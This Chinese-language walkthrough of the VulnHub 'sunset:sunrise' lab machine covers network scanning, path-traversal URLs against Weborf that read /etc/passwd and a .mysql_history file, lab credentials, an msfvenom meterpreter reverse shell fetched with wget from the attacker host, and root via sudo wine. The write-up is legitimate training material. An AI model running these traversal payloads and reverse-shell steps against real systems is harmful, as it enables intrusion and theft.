# vulnhub之sunset:sunrise的实践

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=MzA3MjM5MDc2Nw==&mid=2650746723&idx=1&sn=6dbee03162a960b418819b4a4fa8a9da&chksm=87148e63b0630775f14aab59019612f85a37ac3f6f7817a085da6cb4c8b8cfc2ebe067411592&scene=27#wechat\_redirect](http://mp.weixin.qq.com/s?__biz=MzA3MjM5MDc2Nw==&mid=2650746723&idx=1&sn=6dbee03162a960b418819b4a4fa8a9da&chksm=87148e63b0630775f14aab59019612f85a37ac3f6f7817a085da6cb4c8b8cfc2ebe067411592&scene=27#wechat_redirect)

今天实践的是vulnhub的sunset:sunrise镜像，

用workstation导入成功，先做地址扫描，

sudo netdiscover -r 192.168.137.0/24，

![](../Images/0d92e9bb895472fe272d74bb462f021d.png)

接着做端口扫描，sudo nmap -sS -sV -T5 -A -p- 192.168.137.151，

![](../Images/909687e9b4b07bbc0e2798f293fabbb0.png)

看到8080端口有Weborf/0.12.2服务，搜到存在目录穿越漏洞，

![](../Images/cd4a53b25c4cbeaf1df4f5d2743867ac.png)

访问密码文件，http://192.168.137.151:8080/..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd，

  

![](../Images/56ac61984edab2ec9049b5776689e713.png)

发现sunrise和weborf两个用户，对weborf用户进行目录文件遍历，

dirb http://192.168.137.151:8080/..%2f..%2f..%2f..%2f..%2f..%2f..%2fhome%2fweborf%2f，

![](../Images/1c99ca6d2fe31178bb5472cec7eeaf4d.png)

访问隐藏文件，http://192.168.137.151:8080/..%2f..%2f..%2f..%2f..%2f..%2f..%2fhome%2fweborf%2f/.mysql\_history

![](../Images/220b379ef595ddb9f7fbdc293d994d48.png)

得到用户名密码weborf/iheartrainbows44，

ssh登录，ssh weborf@192.168.137.151，

![](../Images/54585235d52bee0e15463cc3d2c2332e.png)

sudo -l发现不能切到root，继续研究另一个用户，

通过数据库内容能够找到sunrise的用户名和密码，

mysql -u weborf -p  
show databases;  
use mysql;  
show tables;  
select \* from user;

select user,password from user;

![](../Images/597d3733e7240b0745a40b72de037804.png)

得到用户名密码，sunrise/thefutureissobrightigottawearshades，

切换账户，su sunrise，sudo -l发现wine程序是root权限的，

![](../Images/9be4b0aa5a60c13caa9f39c5b588c459.png)

在kali攻击机上造一个反弹shell可执行程序，

msfvenom -a x86 --platform windows -p windows/meterpreter/reverse\_tcp LHOST=192.168.137.230 LPORT=4444 -f exe -o shell.exe，

开启http下载服务，python2 -m SimpleHTTPServer，

在靶机上下载反弹shell可执行程序，cd /tmp，

wget http://192.168.137.230:8000/shell.exe，

在kali攻击机上开一个反弹shell监听，

msfconsole  
use exploit/multi/handler  
set payload windows/meterpreter/reverse\_tcp  
set LHOST 192.168.137.230  
set LPORT 4444  
exploit

在靶机上通过wine程序执行反弹shell程序，sudo wine shell.exe，

kali攻击机上能够获取到靶机的反弹shell，确认是root，

![](../Images/2d5d2b46e19928fda8782d4b9c37e353.png)
